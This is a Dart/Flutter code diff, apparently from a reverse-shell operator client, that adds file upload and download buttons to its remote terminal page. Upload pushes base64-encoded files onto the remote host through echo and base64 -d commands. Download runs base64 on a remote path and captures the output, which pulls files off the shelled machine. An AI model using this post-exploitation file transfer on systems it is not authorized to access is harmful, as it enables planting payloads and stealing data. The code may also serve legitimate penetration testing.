@@ -1,6 +1,8 @@
 import 'dart:async';
 import 'dart:convert';
+import 'dart:io';
 
+import 'package:file_selector/file_selector.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'package:xterm/xterm.dart';
@@ -31,6 +33,9 @@ class _ReverseShellTerminalPageState extends State<ReverseShellTerminalPage> {
   int _termRows = 24;
   // 防抖定时器：窗口拖拽时不向远端频繁发 stty
   Timer? _resizeDebounce;
+  // 文件传输状态
+  bool _uploading = false;
+  bool _downloading = false;
 
   @override
   void initState() {
@@ -116,6 +121,157 @@ class _ReverseShellTerminalPageState extends State<ReverseShellTerminalPage> {
     _terminal.write(fixedText);
   }
 
+  /// 上传文件到远端（Base64 编码通过终端传输）
+  Future<void> _uploadFile() async {
+    if (_uploading) return;
+    final file = await openFile(acceptedTypeGroups: const [XTypeGroup(label: '所有文件')]);
+    if (file == null || !mounted) return;
+    final bytes = await file.readAsBytes();
+    if (!mounted) return;
+
+    final remotePath = await showDialog<String>(
+      context: context,
+      builder: (ctx) {
+        final ctrl = TextEditingController(text: '/tmp/${file.name}');
+        return AlertDialog(
+          backgroundColor: AppColors.bgCard,
+          title: Text('上传到远端路径', style: AppTextStyles.heading(size: 16)),
+          content: TextField(
+            controller: ctrl,
+            style: AppTextStyles.terminal(size: 13, color: AppColors.textPrimary),
+            decoration: InputDecoration(
+              hintText: '/path/to/file',
+              hintStyle: AppTextStyles.caption(size: 12, color: AppColors.textMuted),
+            ),
+          ),
+          actions: [
+            TextButton(onPressed: () => Navigator.pop(ctx), child: const Text('取消')),
+            TextButton(onPressed: () => Navigator.pop(ctx, ctrl.text.trim()), child: const Text('上传')),
+          ],
+        );
+      },
+    );
+    if (remotePath == null || remotePath.isEmpty || !mounted) return;
+
+    setState(() => _uploading = true);
+    try {
+      final b64 = base64Encode(bytes);
+      const chunkSize = 40000;
+      final chunks = <String>[];
+      for (var i = 0; i < b64.length; i += chunkSize) {
+        chunks.add(b64.substring(i, (i + chunkSize > b64.length) ? b64.length : i + chunkSize));
+      }
+      final escapedPath = remotePath.replaceAll("'", "'\\''");
+      if (chunks.length == 1) {
+        widget.session.send("echo '$b64' | base64 -d > '$escapedPath'\n");
+      } else {
+        widget.session.send("rm -f '$escapedPath.b64'\n");
+        for (final chunk in chunks) {
+          final esc = chunk.replaceAll("'", "'\\''");
+          widget.session.send("echo '$esc' >> '$escapedPath.b64'\n");
+        }
+        widget.session.send("base64 -d '$escapedPath.b64' > '$escapedPath' && rm -f '$escapedPath.b64'\n");
+      }
+      if (mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(content: Text('已发送上传命令：$remotePath'), backgroundColor: AppColors.primary),
+        );
+      }
+    } finally {
+      if (mounted) setState(() => _uploading = false);
+    }
+  }
+
+  /// 从远端下载文件（通过 base64 命令捕获输出）
+  Future<void> _downloadFile() async {
+    if (_downloading) return;
+    final remotePath = await showDialog<String>(
+      context: context,
+      builder: (ctx) {
+        final ctrl = TextEditingController();
+        return AlertDialog(
+          backgroundColor: AppColors.bgCard,
+          title: Text('下载远端文件', style: AppTextStyles.heading(size: 16)),
+          content: TextField(
+            controller: ctrl,
+            style: AppTextStyles.terminal(size: 13, color: AppColors.textPrimary),
+            decoration: InputDecoration(
+              hintText: '/path/to/remote/file',
+              hintStyle: AppTextStyles.caption(size: 12, color: AppColors.textMuted),
+            ),
+          ),
+          actions: [
+            TextButton(onPressed: () => Navigator.pop(ctx), child: const Text('取消')),
+            TextButton(onPressed: () => Navigator.pop(ctx, ctrl.text.trim()), child: const Text('下载')),
+          ],
+        );
+      },
+    );
+    if (remotePath == null || remotePath.isEmpty || !mounted) return;
+
+    setState(() => _downloading = true);
+    const startMarker = 'MATRIX_B64_START';
+    const endMarker = 'MATRIX_B64_END';
+    final buffer = StringBuffer();
+    StreamSubscription<List<int>>? captureSub;
+    final completer = Completer<List<int>>();
+
+    captureSub = widget.session.rawStream.listen(
+      (data) {
+        buffer.write(utf8.decode(data, allowMalformed: true));
+        final s = buffer.toString();
+        final startIdx = s.indexOf(startMarker);
+        final endIdx = s.indexOf(endMarker);
+        if (startIdx != -1 && endIdx != -1 && endIdx > startIdx) {
+          final b64 = s.substring(startIdx + startMarker.length, endIdx).replaceAll(RegExp(r'\s'), '');
+          try {
+            final decoded = base64Decode(b64);
+            captureSub?.cancel();
+            if (!completer.isCompleted) completer.complete(decoded);
+          } catch (_) {
+            if (!completer.isCompleted) completer.completeError('Base64 解码失败');
+          }
+        }
+      },
+      onDone: () {
+        if (!completer.isCompleted) completer.completeError('连接已断开');
+      },
+      onError: (e, _) {
+        if (!completer.isCompleted) completer.completeError(e);
+      },
+    );
+
+    widget.session.send("echo $startMarker; base64 '${remotePath.replaceAll("'", "'\\''")}'; echo $endMarker\n");
+
+    try {
+      final decoded = await completer.future.timeout(const Duration(seconds: 60));
+      if (mounted) {
+        await _saveDownloadedFile(decoded, remotePath.split('/').last);
+      }
+    } catch (e) {
+      captureSub.cancel();
+      if (mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(content: Text('下载失败: $e'), backgroundColor: AppColors.red),
+        );
+      }
+    } finally {
+      if (mounted) setState(() => _downloading = false);
+    }
+  }
+
+  Future<void> _saveDownloadedFile(List<int> bytes, String defaultName) async {
+    final location = await getSaveLocation(suggestedName: defaultName);
+    if (location == null || !mounted) return;
+    final file = File(location.path);
+    await file.writeAsBytes(bytes);
+    if (mounted) {
+      ScaffoldMessenger.of(context).showSnackBar(
+        SnackBar(content: Text('已保存到 ${location.path}'), backgroundColor: AppColors.primary),
+      );
+    }
+  }
+
   @override
   Widget build(BuildContext context) {
     return Scaffold(
@@ -163,6 +319,18 @@ class _ReverseShellTerminalPageState extends State<ReverseShellTerminalPage> {
                     ),
                   ),
                   const SizedBox(width: 8),
+                  IconButton(
+                    onPressed: _uploading ? null : _uploadFile,
+                    icon: const Icon(Icons.upload_file, size: 18),
+                    tooltip: '上传文件',
+                    color: AppColors.textSecondary,
+                  ),
+                  IconButton(
+                    onPressed: _downloading ? null : _downloadFile,
+                    icon: const Icon(Icons.download_outlined, size: 18),
+                    tooltip: '下载文件',
+                    color: AppColors.textSecondary,
+                  ),
                   TextButton.icon(
                     onPressed: () async {
                       _closedManually = true;
